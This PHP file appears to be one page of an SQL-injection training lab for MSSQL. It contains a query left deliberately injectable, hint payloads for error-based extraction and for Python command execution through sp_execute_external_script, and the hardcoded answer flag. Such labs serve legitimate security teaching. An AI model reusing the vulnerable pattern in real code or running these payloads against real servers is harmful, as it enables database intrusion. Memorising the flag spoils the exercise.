<?php
require_once __DIR__ . '/../../includes/db.php';

$mode = $_GET['mode'] ?? 'black';
$verify_error = null;

/* =====================
   FLAG VERIFY
===================== */
if (isset($_POST['flag'])) {
    $submitted = $_POST['flag'];

    if ($conn) {
        // Live mode: verify against DB
        try {
            $stmt = $conn->query("SELECT TOP 1 flag FROM flags");
            $row = $stmt->fetch(PDO::FETCH_ASSOC);
            if ($row && $submitted === $row['flag']) {
                $_SESSION['mssql_lab9_solved'] = true;
                header("Location: " . url_lab_from_slug("mssql/lab9", $mode));
                exit;
            } else {
                $verify_error = "Incorrect. Keep trying!";
            }
        } catch (PDOException $e) {
            $verify_error = "Database error. Is the MSSQL container running?";
        }
    } else {
        // Simulation fallback
        if ($submitted === 'FLAG{ms_py_3xt3rn4l_scr1pt}') {
            $_SESSION['mssql_lab9_solved'] = true;
            header("Location: " . url_lab_from_slug("mssql/lab9", $mode));
            exit;
        } else {
            $verify_error = "Incorrect. Keep trying!";
        }
    }
}
?>
<?php if (!empty($driver_missing)): ?>
<div class="result-warning result-box" style="margin-bottom:16px;">
    <strong>Simulation Mode</strong>: <?= htmlspecialchars($driver_missing) ?> driver not installed.
    Query construction shown for learning. Install the driver for live execution.
</div>
<?php endif; ?>

<!-- Lab Description -->
<div class="card">
    <h3>Lab 9. Python sp_execute_external_script</h3>

    <h4>Scenario</h4>
    <p>
        A machine learning dashboard queries MSSQL for prediction data.
        The server has <strong>Machine Learning Services</strong> enabled (formerly R Services),
        which allows executing Python and R scripts directly within MSSQL via
        <code>sp_execute_external_script</code>.
    </p>
    <p>
        Both <code>xp_cmdshell</code> and <code>OLE Automation</code> have been disabled.
        However, with ML Services enabled and sysadmin privileges, Python scripts provide
        yet another RCE path.
    </p>
    <p>
        <em>Note: ML Services are not available on Linux MSSQL in this lab environment.
        The attack chain is demonstrated conceptually. The flag is extracted via CONVERT error-based injection.</em>
    </p>

    <h4>Objective</h4>
    <p>
        Extract the flag from the <code>flags</code> table using error-based extraction.
        The solution demonstrates the <code>sp_execute_external_script</code> technique.
        Submit the flag below.
    </p>

    <h4>Hints</h4>
    <span class="hint-toggle" data-hint="hint1">&#128161; Click for hints</span>
    <div id="hint1" class="hint-content">
        1. Extract flag: <code>' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -</code><br>
        2. Enable external scripts: <code>'; EXEC sp_configure 'external scripts enabled', 1; RECONFIGURE; -- -</code><br>
        3. Execute Python: <code>'; EXEC sp_execute_external_script @language=N'Python', @script=N'import os; os.system("whoami")'; -- -</code><br>
        4. The actual solve uses CONVERT-based extraction. Python execution is demonstrated conceptually.
    </div>
</div>

<!-- Verify Flag -->
<div class="card">
    <h4>Submit Flag</h4>
    <form method="POST" class="form-row">
        <input type="text" name="flag" class="input" placeholder="Enter the flag..." required>
        <button type="submit" class="btn btn-primary">Verify</button>
    </form>

    <?php if ($verify_error): ?>
        <div class="result-error result-box"><?= htmlspecialchars($verify_error) ?></div>
    <?php endif; ?>
</div>

<!-- Solved Banner -->
<?php if (!empty($_SESSION['mssql_lab9_solved'])): ?>

<div class="solved-banner">
    <span class="solved-icon">&#127942;</span>
    <div>
        <div class="solved-title">Lab Solved!</div>
        <div class="solved-desc">You extracted the flag and learned about sp_execute_external_script Python RCE on MSSQL.</div>
    </div>
</div>

<?php else: ?>

<!-- Vulnerable Query Interface -->
<div class="card">
    <h4>ML Predictions Lookup</h4>
    <form method="POST" class="form-row">
<input type="text" name="model" class="input" placeholder="Model name (try: churn)" value="<?= htmlspecialchars($_POST['model'] ?? '') ?>">
        <button type="submit" class="btn btn-primary">Query</button>
    </form>
</div>

<?php
if (isset($_POST['model'])) {
    $model = $_POST['model'];

    // INTENTIONALLY VULNERABLE: direct string concatenation
    $query = "SELECT id, model_name, accuracy, last_trained FROM ml_models WHERE model_name LIKE '%$model%'";

    // Show the executed query in a terminal block
    echo '<div class="terminal">';
    echo '  <div class="terminal-header">';
    echo '    <span class="terminal-dot red"></span>';
    echo '    <span class="terminal-dot yellow"></span>';
    echo '    <span class="terminal-dot green"></span>';
    echo '    <span class="terminal-title">MSSQL Query</span>';
    echo '  </div>';
    echo '  <div class="terminal-body" data-highlight="sql">';
    echo '    <span class="prompt">1&gt; </span>' . htmlspecialchars($query);
    echo '  </div>';
    echo '</div>';

    if ($conn) {
        try {
            $stmt = $conn->query($query);
            $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);

            if (empty($rows)) {
                echo '<div class="result-warning result-box">No models found.</div>';
            } else {
                foreach ($rows as $row) {
                    echo '<div class="result-data result-box">';
                    echo '<strong>' . htmlspecialchars($row['model_name'] ?? '') . '</strong>';
                    echo ' &nbsp;&bull;&nbsp; Accuracy: ' . htmlspecialchars($row['accuracy'] ?? '') . '%';
                    echo ' &nbsp;&bull;&nbsp; Trained: ' . htmlspecialchars($row['last_trained'] ?? '');
                    echo '</div>';
                }
            }
        } catch (PDOException $e) {
            echo '<div class="result-error result-box">';
            echo '<strong>MSSQL Error:</strong><br>' . htmlspecialchars($e->getMessage());
            echo '</div>';
        }
    } else {
        echo '<div class="result-warning result-box">';
        echo '<strong>Simulation Mode:</strong> Query shown above for learning. Install the driver for live results.';
        echo '</div>';
    }
}
?>

<?php endif; ?>
